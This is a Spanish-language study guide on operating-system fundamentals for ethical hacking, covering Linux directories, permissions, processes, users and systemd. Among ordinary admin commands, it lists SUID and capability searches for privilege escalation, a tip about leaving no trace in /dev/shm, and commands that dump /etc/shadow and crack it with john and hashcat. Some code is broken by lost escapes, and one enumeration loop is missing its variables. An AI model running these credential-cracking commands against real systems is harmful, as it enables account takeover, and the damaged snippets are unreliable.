# Fundamentos de Sistemas Operativos para Hacking


> **Aviso:** Este documento es puramente educativo. Todo el conocimiento acá compartido es para entender cómo funcionan los sistemas operativos por dentro, con el fin de aprender seguridad informática y ethical hacking. 
---

## Tabla de Contenidos

1. [Introducción a Sistemas Operativos](#1-introduccion-a-sistemas-operativos)
2. [Linux — Fundamentos](#2-linux--fundamentos)
3. [Windows — Fundamentos](#3-windows--fundamentos)
4. [comparación y Contraste](#4-comparacion-y-contraste)

---

## 1. Introducción a Sistemas Operativos

### 1.1 ¿Qué es un [sistema operativo](../raw/0s-f0nd4m3nt0s.md#sistemas-operativos)?

Un sistema operativo (SO) es la capa de software que actúa de intermediario entre el hardware de una computadora y los programas que se ejecutan en ella. Sin un SO, tendrías que escribir código directamente para cada pieza de hardware: el disco, la memoria, la placa de [red](../raw/r3d3s-f0nd4m3nt0s.md), el teclado. Imaginate tener que programar vos mismo cómo leer un sector del disco cada vez que un programa quiere abrir un archivo. Un delirio.

El sistema operativo se encarga de:

- **Gestión de procesos:** decidir qué programa se ejecuta, cuándo y por cuánto tiempo.
- **Gestión de memoria:** asignar y liberar memoria RAM para los programas.
- **Gestión de almacenamiento:** organizar cómo se guardan y recuperan los archivos.
- **Gestión de dispositivos:** comunicarse con el hardware a través de drivers.
- **Seguridad:** controlar qué usuario o [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) tiene acceso a qué recursos.
- **Red:** proporcionar una interfaz para que los programas envíen y reciban datos a través de la red.

### 1.2 Modos de operación: [kernel](../raw/0s-f0nd4m3nt0s.md#kernel) mode vs user mode

Los procesadores modernos tienen niveles de privilegio. En [x86](../raw/4ss3mbly-f0r-h4ck3rs.md#x86) se llaman "rings". El ring 0 es el más privilegiado (corre el kernel), y el ring 3 es el menos privilegiado (corren las aplicaciones de usuario).

- **Kernel mode (ring 0):** tiene acceso completo al hardware, puede ejecutar cualquier instrucción de la CPU, acceder a toda la memoria. Si algo crashea acá, es un kernel panic o un Blue Screen of Death (BSOD).
- **User mode (ring 3):** las aplicaciones se ejecutan acá. No pueden acceder directamente al hardware ni a la memoria del kernel. Si crashean, el sistema sigue funcionando. Para hacer algo que requiere privilegios, tienen que hacer una **system call** ([syscall](../raw/0s-f0nd4m3nt0s.md#syscalls)).

Esta separación es fundamental para la seguridad y estabilidad del sistema. Un programa en user mode no puede leer la memoria de otro programa ni la del kernel, a menos que haya una [vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades) que lo permita (y ahí es donde entra el hacking).

### 1.3 System calls

Cuando un programa necesita hacer algo que requiere privilegios (leer un archivo, crear un proceso, enviar un paquete de red), hace una system call. El flujo es:

1. El programa en user mode prepara los argumentos en registros.
2. Ejecuta una instrucción especial (int 0x80 en x86 clásico, sysenter/syscall en modernos).
3. La CPU cambia a kernel mode.
4. El kernel ejecuta la operación solicitada.
5. La CPU vuelve a user mode y devuelve el resultado.

Ejemplos de syscalls en Linux: 
read, write, open, close, fork, execve, mmap, socket, connect, bind.

### 1.4 Interrupciones y excepciones

Las interrupciones son señales que envía el hardware a la CPU para avisarle que pasó algo: "llegó un paquete de red", "el usuario apretó una tecla", "el disco terminó de leer". La CPU deja lo que está haciendo, ejecuta un **manejador de interrupción** (interrupt handler) y después vuelve a lo que estaba.

Las excepciones son condiciones anómalas que ocurren durante la ejecución de una instrucción: división por cero, page fault, invalid opcode. El kernel las maneja, y si no puede recuperarse, mata el proceso (segfault) o crashea el sistema si ocurre en kernel mode.

### 1.5 Memoria virtual

Cada proceso tiene su propio espacio de direcciones virtuales. El kernel, junto con la MMU (Memory Management Unit) del procesador, se encarga de mapear esas direcciones virtuales a direcciones físicas reales. Esto da:

- **Aislamiento:** un proceso no puede ver la memoria de otro.
- **Espacio de direcciones contiguo:** aunque la memoria física esté fragmentada, el proceso ve su memoria como un bloque contiguo.
- **Swap:** el sistema puede mover páginas de memoria al disco cuando no hay suficiente RAM, y traerlas de vuelta cuando se necesitan.

### 1.6 Boot y ciclo de vida del sistema

- **Power-on:** la BIOS/[uefi](../raw/u3f1-r00tk1ts.md) realiza el POST (Power-On Self Test) e inicializa el hardware básico.
- **Bootloader:** busca un dispositivo booteable, carga el bootloader (GRUB, bootmgr, etc.) desde el MBR/GPT.
- **Carga del kernel:** el bootloader carga el kernel en memoria y le pasa el control.
- **Init (PID 1):** el kernel monta el [sistema de archivos](../raw/0s-f0nd4m3nt0s.md#sistema-de-archivos) raíz y ejecuta init ([systemd](../raw/l1n9x-4dm1n.md#systemd) en modernos, sysvinit en viejos).
- **Servicios:** init arranca los servicios del sistema según el runlevel/target.
- **Login:** se presenta una pantalla de login (TTY o gráfica).
- **Shutdown:** se detienen servicios, se desmontan archivos, se sincronizan los buffers y se corta la energía.

### 1.7 Conceptos de seguridad a nivel SO

- **Least privilege:** un proceso o usuario solo debe tener los [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) mínimos necesarios para hacer su trabajo.
- **Attack surface reduction:** cuantos más servicios, drivers y features activos, más superficie de ataque.
- **[privilege escalation](../raw/l1n9x-pr1v3sc.md):** cuando un atacante pasa de tener acceso limitado (user normal) a tener más privilegios (root/Administrator). Es uno de los pasos más importantes en un ataque.
- **Defense in depth:** múltiples capas de seguridad. Si una falla, la otra ataja.
- **Separation of privileges:** diferentes cuentas para diferentes roles (nadie usa root para todo).

### 1.8 ¿Por qué un pentester necesita saber esto?

Porque el sistema operativo es el campo de batalla. Si no entendés cómo funciona un proceso, no podés enumerarlo. Si no sabés qué es el registro de Windows, no vas a encontrar las claves de [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia) que dejó un malware. Si no sabés cómo se manejan los permisos en Linux, no vas a entender cómo escalar privilegios.

Cada ataque, cada defensa, cada técnica de evasión, cada [exploit](../raw/m3t4spl01t.md#exploits) — todo pasa por el sistema operativo. Saber cómo funciona por dentro te da una ventaja enorme.

---
## 2. Linux — Fundamentos

### 2.1 Jerarquía del [sistema de archivos](../raw/0s-f0nd4m3nt0s.md#sistema-de-archivos)

Linux organiza todo como archivos. No solo documentos y programas, sino también dispositivos, información del [kernel](../raw/0s-f0nd4m3nt0s.md#kernel), configuraciones, procesos. Todo cuelga de la raíz /, formando una estructura de árbol única. Esto se conoce como **Filesystem Hierarchy Standard (FHS)**.

#### / — Raíz

Es la base de todo el sistema de archivos. No hay C:, D:, ni nada parecido. Acá arranca todo. Si montás un disco en /mnt/disco, ese disco aparece como una carpeta más dentro de /.

#### /bin — Binarios esenciales

Contiene los ejecutables que necesita el sistema para arrancar y funcionar en modo single-user. Cosas como ls, cat, cp, mv, sh, bash. Antes era un symlink a /usr/bin, pero en sistemas modernos es /usr/bin directamente.

En un pentest, si ves que podés escribir en /bin.. felicitaciones, tenés control total del sistema (o estás a punto de tenerlo).

#### /sbin — Binarios del sistema

Binarios necesarios para la administración del sistema: fdisk, mkfs, mount, ifconfig, [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip), 
eboot, shutdown. También suele ser un symlink a /usr/sbin.

#### /etc — Configuración del sistema

Probablemente el directorio más importante para un pentester. Acá vive toda la configuración del sistema:

- /etc/passwd — usuarios del sistema (world-readable por razones históricas).
- /etc/shadow — hashes de contraseñas (solo root puede leerlo).
- /etc/group — grupos de usuarios.
- /etc/sudoers — quién puede hacer [sudo](../raw/l1n9x-pr1v3sc.md#sudo) y qué comandos.
- /etc/hostname — nombre del host.
- /etc/hosts — resolución local de nombres (anterior a [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns)).
- /etc/resolv.conf — servidores DNS.
- /etc/network/ — config de [red](../raw/r3d3s-f0nd4m3nt0s.md) en distros tradicionales.
- /etc/ssh/ — configuración del servidor SSH. Claves, auth, banners.
- /etc/nginx/ o /etc/apache2/ — config de servidores web.
- /etc/crontab — tareas programadas del sistema.
- /etc/fstab — tabla de sistemas de archivos que se montan al arrancar.
- /etc/issue y /etc/issue.net — mensaje de login.
- /[cron](../raw/l1n9x-pr1v3sc.md#cron-jobs).d/, /[cron](../raw/l1n9x-pr1v3sc.md#cron-jobs).hourly/, /[cron](../raw/l1n9x-pr1v3sc.md#cron-jobs).daily/, etc. — scripts [cron](../raw/l1n9x-pr1v3sc.md#cron-jobs).
- /etc/aliases — alias de correo.
- /etc/environment — variables de entorno del sistema.

Enumerar /etc es siempre el primer paso después de conseguir acceso a un sistema Linux.

#### /var — Datos variables

Archivos que cambian de tamaño y contenido constantemente:

- /var/log/ — logs del sistema. DONDE BUSCAR TODO. auth.log, syslog, kern.log, apache2/access.log, btmp, wtmp, lastlog.
- /var/log/journal/ — logs binarios de [systemd](../raw/l1n9x-4dm1n.md#systemd)-journald.
- /var/spool/ — datos en cola (correos, print jobs, cron).
- /var/tmp/ — archivos temporales que persisten entre reinicios (a diferencia de /tmp).
- /var/www/ — en servidores web suele estar el contenido de los sitios web.
- /var/cache/ — datos caché de aplicaciones (apt, yum, etc.).
- /var/lib/ — datos de estado de aplicaciones.

En un pentest, /var/log/auth.log es un tesoro. Ahí están todos los intentos de login, exitosos y fallidos. /var/log/apache2/access.log te muestra qué rutas se pidieron, desde qué IP, con qué user-agent.

#### /proc — Sistema de archivos virtual del kernel

Esto es mágico. No es un sistema de archivos real en el disco; es una interfaz virtual que expone información del kernel y los procesos en tiempo real. Cada [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) tiene una carpeta con su PID:

- /proc/[PID]/ — información del proceso con ese PID.
- /proc/[PID]/cmdline — el comando exacto que inició el proceso.
- /proc/[PID]/environ — variables de entorno del proceso.
- /proc/[PID]/fd/ — archivos abiertos (file descriptors) como symlinks.
- /proc/[PID]/maps — regiones de memoria mapeadas.
- /proc/[PID]/mem — acceso a la memoria del proceso (requiere mismo UID o root).
- /proc/[PID]/status — estado del proceso en texto legible.
- /proc/[PID]/net/ — información de red del proceso.
- /proc/[PID]/cwd — symlink al directorio de trabajo actual.
- /proc/[PID]/root — symlink a la raíz del proceso (útil para contenedores).
- /proc/[PID]/exe — symlink al ejecutable.

Archivos globales importantes:

- /proc/cpuinfo — información de la CPU.
- /proc/meminfo — uso de memoria.
- /proc/version — versión del kernel.
- /proc/cmdline — parámetros con los que arrancó el kernel.
- /proc/partitions — particiones del sistema.
- /proc/modules — módulos del kernel cargados.
- /proc/net/[tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp), /proc/net/[udp](../raw/r3d3s-f0nd4m3nt0s.md#udp) — conexiones [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp)/[udp](../raw/r3d3s-f0nd4m3nt0s.md#udp) activas.
- /proc/filesystems — sistemas de archivos soportados.
- /proc/mounts — sistemas de archivos montados.
- /proc/swaps — particiones de swap.
- /proc/uptime — tiempo desde el arranque.
- /proc/loadavg — carga promedio del sistema.
- /proc/self/ — symlink al PID del proceso que lo lee.

#### /sys — Sysfs

Expone información sobre dispositivos, drivers y componentes del kernel:

- /sys/class/ — clasificación de dispositivos (net, block, input, etc.).
- /sys/block/ — dispositivos de bloque (discos).
- /sys/devices/ — árbol de dispositivos.
- /sys/kernel/ — parámetros del kernel.
- /sys/power/ — estado de energía.
- /sys/bus/ — buses del sistema (PCI, USB, etc.).
- /sys/[firmware](../raw/u3f1-r00tk1ts.md#firmware)/ — información del [firmware](../raw/u3f1-r00tk1ts.md#firmware)/BIOS.

#### /dev — Dispositivos

Acá viven los archivos de dispositivo. Todo dispositivo en Linux está representado por un archivo:

- /dev/sda — primer disco SCSI/SATA.
- /dev/sda1 — primera partición de ese disco.
- /dev/nvme0n1 — disco NVMe.
- /dev/tty — terminales.
- /dev/null — el agujero negro. Todo lo que se escribe acá desaparece.
- /dev/zero — produce ceros infinitos.
- /dev/random y /dev/urandom — números aleatorios.
- /dev/pts/ — pseudo-terminales (SSH, terminales gráficas).
- /dev/shm — tmpfs en RAM, útil para herramientas sin dejar rastro.

Tipos: **Block devices** (b) para discos, **Character devices** (c) para serial/teclado.

#### /tmp — Archivos temporales

Cualquier usuario puede escribir acá. Peligro para symlink attacks. En algunos sistemas, 
oexec está activado, así que usá /dev/shm mejor.

#### /usr — Unix System Resources

- /usr/bin/ — la mayoría de los comandos del usuario.
- /usr/sbin/ — binarios de administración.
- /usr/lib/ — bibliotecas compartidas.
- /usr/local/ — software compilado por el usuario.
- /usr/share/ — datos compartidos independientes de la arquitectura.
- /usr/include/ — headers de C/C++.

#### /home — Directorios personales

Cada usuario tiene su carpeta acá. .bashrc, .ssh/authorized_keys, .bash_history, documentos personales. Si accedés a /home/usuario/.ssh/, tenés las claves SSH.

#### /root — Home del usuario root

No está en /home/root por seguridad. Si llegás acá, ya ganaste.

#### /boot — Archivos de arranque

- vmlinuz-* — el kernel de Linux comprimido.
- initrd.img-* o initramfs-* — sistema de archivos inicial en RAM.
- config-* — configuración del kernel.
- grub/ o efi/ — archivos del gestor de arranque GRUB.

#### /opt — Software opcional

Herramientas de terceros instaladas manualmente.

#### /mnt y /media — Puntos de montaje

- /mnt/ — montajes temporales manuales.
- /media/ — montajes automáticos (USB, CD-ROM).

#### /srv — Datos de servicios

Datos de servicios [http](../raw/r3d3s-f0nd4m3nt0s.md#http), FTP, etc.

#### /run — Archivos de ejecución

Temporales desde el arranque. Reemplaza a /var/run. PIDs, sockets, locks.

#### /lost+found

Fragmentos de archivos recuperados por fsck después de un crash.

---
### 2.2 [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) de Archivos

#### 2.2.1 Permisos tradicionales (ugo/rwx)

En Linux, cada archivo y directorio tiene tres categorías de permisos:

- **u (user/owner):** el dueño del archivo.
- **g (group):** el grupo al que pertenece el archivo.
- **o (others):** todos los demas.

Y tres tipos de permisos:

- **r (read):** lectura. En un directorio, listar contenido.
- **w (write):** escritura. En un directorio, crear/borrar archivos (incluso si no sos dueño del archivo, si tenes w en el directorio, podes borrarlo).
- **x (execute):** ejecucion. En un directorio, poder entrar (cd) y acceder a archivos dentro (si tenes el nombre exacto).

Se representan como una cadena de 10 caracteres:

`
-rwxr-xr--
`

- Posicion 1: tipo (- archivo, d directorio, l symlink, c char device, b block device, s socket, p pipe).
- Posiciones 2-4: permisos del duenio.
- Posiciones 5-7: permisos del grupo.
- Posiciones 8-10: permisos de otros.

Tambien en octal:

`
r = 4
w = 2
x = 1
`

Entonces rwxr-xr-- es 755 (duenio 7=4+2+1, grupo 5=4+1, otros 4).

#### 2.2.2 [chmod](../raw/0s-f0nd4m3nt0s.md#permisos) - Cambiar permisos

`ash
chmod 755 archivo.sh # modo octal
chmod u+x archivo.sh # agrega execute al duenio
chmod g-w archivo.sh # saca write al grupo
chmod o=r archivo.sh # otros solo lectura
chmod -R 755 directorio/ # recursivo
chmod a+x archivo.sh # a todos (ugo) agrega execute
`

Permisos especiales con cuarto digito octal:

`ash
chmod 4755 archivo.sh # 4 = [suid](../raw/l1n9x-pr1v3sc.md#suid)
chmod 2755 archivo.sh # 2 = SGID
chmod 1755 directorio/ # 1 = Sticky bit
`

#### 2.2.3 chown y chgrp - Cambiar duenio y grupo

`ash
chown usuario:grupo archivo # cambiar duenio y grupo
chown usuario archivo # solo duenio
chown :grupo archivo # solo grupo (equivale a chgrp)
chgrp grupo archivo # cambiar grupo
chown -R usuario:grupo dir/ # recursivo
`

Solo root puede cambiar el duenio. Un usuario puede cambiar el grupo solo a uno del que sea miembro.

#### 2.2.4 Umask

El umask define los permisos por defecto para archivos nuevos:

`ash
umask # muestra la mascara actual
umask 077 # modo restrictivo: archivos 600, directorios 700
`

La mascara se resta de los permisos base:
- Archivos: base 666 (rw-rw-rw-)
- Directorios: base 777 (rwxrwxrwx)

Con umask 022:
- Archivo: 666 - 022 = 644 (rw-r--r--)
- Directorio: 777 - 022 = 755 (rwxr-xr-x)

#### 2.2.5 SUID, SGID y Sticky Bit

**SUID ([set](../raw/ph1sh1ng.md#social-engineering-toolkit) User ID) - 4xxx**

Cuando un archivo ejecutable tiene SUID, se ejecuta con los permisos del duenio del archivo.

`ash
-rwsr-xr-x root root /usr/bin/passwd
`

Para buscar SUIDs:

`ash
find / -perm -4000 -type f 2>/dev/null
`

**SGID (Set Group ID) - 2xxx**

En ejecutables corre con el grupo del archivo. En directorios, los archivos nuevos heredan el grupo.

`ash
find / -perm -2000 -type f 2>/dev/null # buscar SGID
`

**Sticky Bit - 1xxx**

En directorios como /tmp, solo el duenio del archivo (o root) puede borrar archivos dentro:

`ash
chmod +t directorio/ # poner sticky bit
drwxrwxrwt root root /tmp # la t al final
`

#### 2.2.6 ACLs (Access Control Lists)

Permisos granulares para multiples usuarios y grupos:

`ash
setfacl -m u:pepe:rwx archivo # dar permisos a pepe
setfacl -m g:devs:rx archivo # dar permisos al grupo devs
setfacl -x u:pepe archivo # remover entrada de pepe
setfacl -b archivo # remover todas las ACLs
setfacl -R -m u:pepe:r dir/ # recursivo
getfacl archivo # ver ACLs
`

Cuando un archivo tiene ACLs, ls -l muestra un + al final de los permisos.

#### 2.2.7 Atributos extendidos (chattr)

`ash
chattr +i archivo # inmutable: no se puede modificar, borrar, renombrar
chattr +a archivo # append only: solo se puede agregar datos
chattr -i archivo # remover inmutable
lsattr archivo # listar atributos
`

El atributo +i es letal. Ni root puede modificar el archivo sin sacar el atributo primero.

#### 2.2.8 Filesystem [capabilities](../raw/l1n9x-pr1v3sc.md#linux-capabilities)

Las capabilities permiten dar permisos especificos a un binario sin usar SUID:

`ash
getcap /usr/bin/ping # ver capabilities
setcap cap_net_raw+ep /usr/bin/ping # dar capability
setcap -r /usr/bin/ping # remover capabilities
`

Ejemplos utiles:
- cap_net_bind_service: bindear a puertos privilegiados (<1024).
- cap_net_raw: usar raw sockets (ping, sniffing).
- cap_sys_admin: administracion del sistema.
- cap_dac_override: bypass de permisos de archivos.

Para pentesting, buscar binarios con capabilities vulnerables:

`ash
getcap -r / 2>/dev/null
`

---### 2.3 Procesos

#### 2.3.1 Que es un proceso?

Un proceso es una instancia de un programa en ejecucion. Cada vez que ejecutas un comando, se crea un proceso. El kernel le asigna un PID (Process ID), memoria, recursos y un estado.

Los procesos se organizan en un arbol. El proceso init (PID 1 en sistemas modernos con systemd es systemd, en sistemas viejos era init) es el padre de todos.

#### 2.3.2 Comando ps

Muestra informacion de procesos. Versiones mas comunes: BSD, Unix y GNU.

`ash
ps aux # todos los procesos de todos los usuarios
ps -ef # formato completo
ps -eo pid,ppid,cmd,%cpu,%mem --sort=-%cpu # formato personalizado
ps aux --forest # vista de arbol
ps -U root -u root # procesos de root
ps -p 1234 # proceso especifico por PID
`

Columnas importantes:
- PID: Process ID.
- PPID: Parent Process ID.
- %CPU: uso de CPU.
- %MEM: uso de memoria.
- VSZ: memoria virtual.
- RSS: memoria residente (RAM fisica).
- TTY: terminal asociada.
- STAT: estado del proceso.
- TIME: tiempo de CPU acumulado.
- CMD: comando (truncado).

Estados (STAT):
- R: running o runnable (en cola de ejecucion).
- S: sleeping (interrumpible, esperando un evento).
- D: uninterruptible sleep (esperando I/O).
- T: stopped (por senial SIGSTOP).
- Z: zombie (termino pero el padre no recogio el exit code).
- <: alta prioridad.
- N: baja prioridad (nice).
- s: session leader.
- L: tiene paginas lockeadas en memoria.

#### 2.3.3 top y htop

`ash
top # monitor interactivo de procesos
top -u usuario # procesos de un usuario
top -p 1234,5678 # procesos especificos
`

En top:
- M ordena por uso de memoria.
- P ordena por uso de CPU.
- k mata un proceso (pedira PID y senial).
- r renice (cambiar prioridad).
- q salir.
- 1 muestra cada CPU individual.
- c muestra linea de comando completa.

`ash
htop # version mejorada con colores, mouse, barras
htop -p 1234 # procesos especificos
htop -u pepe # procesos de un usuario
htop -s PERCENT_CPU # ordenar por CPU
`

#### 2.3.4 kill, killall, pkill

Las seniales son mensajes que se envian a los procesos:

| Senial | # | Accion |
|--------|---|--------|
| SIGHUP | 1 | Colgar terminal, recargar config |
| SIGINT | 2 | Ctrl+C, interrupcion |
| SIGQUIT | 3 | Ctrl+\, salida con core dump |
| SIGKILL | 9 | Mata inmediatamente, no se captura |
| SIGTERM | 15 | Terminacion ordenada (default de kill) |
| SIGSTOP | 19 | Pausa (no se captura) |
| SIGCONT | 18 | Continua despues de STOP |
| SIGSEGV | 11 | Segmentacion fallida (acceso ilegal a memoria) |

`ash
kill PID # por defecto SIGTERM (15)
kill -9 PID # SIGKILL (9) - mata de forma forzosa
kill -15 PID # SIGTERM (15)
kill -1 PID # SIGHUP (1) - recarga configuracion
kill -STOP PID # SIGSTOP - pausa el proceso
kill -CONT PID # SIGCONT - reanuda proceso pausado

killall nombre_proceso # mata todos los procesos con ese nombre
pkill -u usuario # mata procesos de un usuario
`

#### 2.3.5 nice y renice

`ash
nice -n 10 comando # ejecutar con prioridad baja
nice --20 comando # ejecutar con prioridad alta (requiere sudo)
renice +5 -p PID # bajar prioridad 5
renice -5 -p PID # subir prioridad 5 (requiere sudo)
renice -n 10 -u usuario # cambiar prioridad de todos los procesos de un usuario
`

Rango nice: -20 (maxima prioridad) a +19 (minima prioridad). Default: 0.

#### 2.3.6 /proc en profundidad

Cada proceso tiene un directorio en /proc/PID/. Los archivos mas utiles para un pentester:

`ash
cat /proc/PID/cmdline # linea de comando completa (null-separated)
cat /proc/PID/status # estado, UID, GID, memoria, senial pendiente
cat /proc/PID/environ # variables de entorno (separadas por null)
ls -la /proc/PID/fd/ # file descriptors abiertos
cat /proc/PID/maps # regiones de memoria mapeadas
cat /proc/PID/smaps # detalle de uso de memoria por mapping
cat /proc/PID/cgroup # grupos de control del proceso
ls -la /proc/PID/ns/ # namespaces (util para detectar contenedores)
cat /proc/PID/limits # limites de recursos
cat /proc/PID/sched # estadisticas del scheduler
cat /proc/PID/mountinfo # informacion de monturas
cat /proc/PID/wchan # canal de espera del proceso
/proc/PID/exe # symlink al ejecutable
/proc/PID/cwd # symlink al directorio actual
/proc/PID/root # symlink a la raiz (util en chroot/contenedores)
`

Enumeracion de procesos completa:

`ash
for pid in /proc/[0-9]*; do echo "PID: " echo "  CMD: " echo "  USER: " echo "  MEM: "
done
`

#### 2.3.7 Procesos zombie y huerfanos

**Zombie:** un proceso termino, libero sus recursos, pero su entrada en la tabla de procesos sigue ocupada porque el padre no recogio el exit code. No consumen CPU ni memoria (mas alla de la entrada en la tabla).

`ash
ps aux | grep Z # buscar zombies
`

**Huerfano:** el proceso padre murio pero el hijo sigue ejecutandose. El kernel automaticamente los adopta y pasan a ser hijos de init/systemd (PID 1).

#### 2.3.8 Foreground y background

`ash
comando & # ejecutar en background
Ctrl+Z # suspender proceso foreground
bg # reanudar proceso suspendido en background
fg # traer proceso de background a foreground
jobs # listar trabajos del shell
jobs -l # incluir PIDs
`

#### 2.3.9 Uso de recursos

`ash
ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%mem | head # procesos que mas memoria usan
ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu | head # procesos que mas CPU usan
`

---### 2.4 Usuarios y Grupos

#### 2.4.1 /etc/passwd - Base de datos de usuarios

Cada linea representa un usuario:

```
pepe:x:1000:1000:Jose Perez,,,:/home/pepe:/bin/bash
```

Campos separados por `:`:
1. Nombre de usuario.
2. Contrasenia (antiguamente aca, ahora es x y va en /etc/shadow).
3. UID (User ID). 0 = root. 1-999 = system accounts. 1000+ = usuarios normales.
4. GID (Group ID) del grupo principal.
5. GECOS: nombre completo, oficina, telefono, etc. (separados por coma).
6. Home directory.
7. Shell de login (puede ser /bin/false, /sbin/nologin, etc.).

Este archivo es world-readable. Cualquier usuario del sistema puede leerlo.

#### 2.4.2 /etc/shadow - Hashes de contrasenias

Solo root y el grupo shadow pueden leerlo.

```
pepe:$y$j9T$OQ3VNUqO3..:19375:0:99999:7:::
```

Campos:
1. Nombre de usuario.
2. [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) de la contrasenia. Formatos: - $y$j9T$.. - yescrypt (nuevo estandar). - $6$salt$.. - SHA-512 (comun en sistemas mas viejos). - $5$salt$.. - SHA-256. - $2y$.. - bcrypt. - $1$salt$.. - MD5 (old, debil). - !! - cuenta bloqueada, sin contrasenia. - * - cuenta deshabilitada.
3. Dias desde 1/1/1970 del ultimo cambio de contrasenia.
4. Dias minimos entre cambios.
5. Dias maximos de validez.
6. Dias de advertencia antes de expirar.
7. Dias de gracia despues de expirar.
8. Fecha de expiracion de la cuenta (dias desde epoch).
9. Reservado.

Para un pentester, si obtenes este archivo, podes crackear los hashes offline (con [hashcat](../raw/p4ssw0rd-4tt4cks.md#hashcat), [john](../raw/p4ssw0rd-4tt4cks.md#john-the-ripper)):

```bash
unshadow /etc/passwd /etc/shadow > hashes.txt # preparar para john
john hashes.txt # crackear
hashcat -m 1800 hashes.txt rockyou.txt # crackear con hashcat (SHA-512)
```

#### 2.4.3 /etc/group - Grupos

```
sudo:x:27:pepe,maria,jose
```

Campos:
1. Nombre del grupo.
2. Contrasenia de grupo (rara vez usada).
3. GID.
4. Miembros del grupo (separados por coma).

#### 2.4.4 Comandos de gestion de usuarios

```bash
useradd pepe # crear usuario
useradd -m -s /bin/bash -G sudo,docker pepe # con home, shell y grupos
useradd -u 1500 -g 1000 pepe # con UID y GID especificos

usermod -aG docker pepe # agrega al grupo docker (sin -a zafa los otros grupos)
usermod -L pepe # lockea la cuenta (pone ! en el hash)
usermod -U pepe # unlockea

userdel pepe # borra usuario
userdel -r pepe # borra usuario y su home

passwd pepe # cambiar contrasenia
passwd -l pepe # lockear cuenta
passwd -u pepe # unlockear
passwd -d pepe # borrar contrasenia
passwd -S pepe # estado de la contrasenia
passwd -e pepe # expirar, obliga a cambiar en proximo login

chage -l pepe # informacion de envejecimiento de contrasenia
chage -E 2025-12-31 pepe # expira la cuenta en esa fecha
chage -M 90 pepe # contrasenia maxima 90 dias
```

#### 2.4.5 Gestion de grupos

```bash
groupadd desarrolladores # crear grupo
groupadd -g 1500 desarrolladores # con GID especifico
groupmod -n devs desarrolladores # renombrar grupo
groupdel devs # borrar grupo
gpasswd -a pepe devs # agregar usuario al grupo
gpasswd -d pepe devs # remover usuario del grupo
groups pepe # listar grupos de un usuario
```

#### 2.4.6 su - [switch](../raw/r3d3s-f0nd4m3nt0s.md#switches) User

```bash
su # cambiar a root (pide contrasenia de root)
su - # login shell (carga entorno de root)
su pepe # cambiar a pepe
su - pepe # login shell de pepe
su -c "comando" # ejecutar comando como otro usuario
```

Con su -, haces un login completo. Con su a secas, mantenes el directorio actual.

#### 2.4.7 sudo - Superuser Do

```bash
sudo comando # ejecutar comando como root
sudo -u pepe comando # ejecutar como pepe
sudo -l # listar comandos que podemos ejecutar con sudo
sudo -k # invalidar cache de timestamp
sudo -i # login shell como root
sudo -s # shell como root (no login)
sudo -u pepe -s # shell como pepe
```

La configuracion esta en /etc/sudoers (y en /etc/sudoers.d/):

```
# Sintaxis:
# usuario host_list=(runas) [NOPASSWD:] COMANDOS

root ALL=(ALL:ALL) ALL # root puede todo
%sudo ALL=(ALL:ALL) ALL # grupo sudo puede todo
pepe ALL=(ALL) NOPASSWD: /usr/bin/apt # pepe puede apt sin contrasenia
```

Hay que editar con visudo, que valida la sintaxis antes de guardar. Si rompes /etc/sudoers, perdes acceso sudo.

Para un pentester, sudo -l es sagrado. GTFOBins es tu mejor amigo para esto.

#### 2.4.8 Archivos de estado de login

- /var/run/utmp: usuarios logueados actualmente (who, w).
- /var/log/wtmp: historial de logins (last).
- /var/log/btmp: intentos de login fallidos (lastb).

```bash
who # quien esta logueado ahora
w # mas detallado
last # historial de logins exitosos
lastb # historial de logins fallidos
lastlog # ultimo login de cada usuario
users # solo nombres de usuarios logueados
id # uid, gid, grupos del usuario actual
```

#### 2.4.9 Cuentas del sistema

- root (UID 0): todopoderoso.
- daemon (UID 1): procesos del sistema.
- bin (UID 2): historica.
- nobody (UID 65534): sin privilegios para servicios.

Enumeracion de cuentas con shell:

```bash
cat /etc/passwd | grep -E '/(bash|sh|zsh|dash|fish)$'
```

---### 2.5 Servicios y Systemd

#### 2.5.1 Introduccion a systemd

systemd es el sistema init de la mayoria de las distros modernas. Es el PID 1. Reemplazo a SysV init y Upstart. No solo maneja el arranque; hace de todo: gestion de servicios, timers, logging (journald), hostname, time, DNS (resolved), y mas.

#### 2.5.2 systemctl - Gestion de servicios

```bash
systemctl status nombre.service # estado del servicio
systemctl start nombre.service # iniciar
systemctl stop nombre.service # detener
systemctl restart nombre.service # reiniciar
systemctl reload nombre.service # recargar configuracion
systemctl enable nombre.service # habilitar en el arranque
systemctl disable nombre.service # deshabilitar en el arranque
systemctl enable --now nombre.service # habilitar e iniciar ahora

systemctl is-active nombre.service # verificar si esta activo
systemctl is-enabled nombre.service  # verificar si esta habilitado
systemctl list-units --type=service  # listar servicios
systemctl list-unit-files # todos los archivos de unidad
systemctl list-dependencies nombre.service # dependencias
```

#### 2.5.3 Unit files

Los unit files definen servicios, sockets, timers, mount points, etc. Viven en:
- /lib/systemd/system/ - del paquete instalado (no tocar).
- /run/systemd/system/ - runtime.
- /etc/systemd/system/ - personalizadas (sobrescribe a /lib).

Ejemplo de unit file:

```
[Unit]
Description=Mi servicio personalizado
After=network.target
Wants=network-online.target

[Service]
Type=simple
User=pepe
Group=pepe
WorkingDirectory=/opt/mi-app
ExecStart=/usr/bin/node /opt/mi-app/index.js
ExecReload=/bin/kill -HUP $MAINPID
Restart=on-failure
RestartSec=5
Environment=NODE_ENV=production
LimitNOFILE=65536

[Install]
WantedBy=multi-user.target
```

Tipos de servicio (Type=):
- simple: el proceso principal del servicio. systemd asume que arranco inmediatamente.
- forking: el proceso hace fork, el padre termina. systemd espera el PID del hijo.
- oneshot: ejecuta y termina. Util para tareas unicas.
- notify: el servicio avisa con sd_notify cuando esta listo.
- dbus: el servicio se registra en D-Bus.

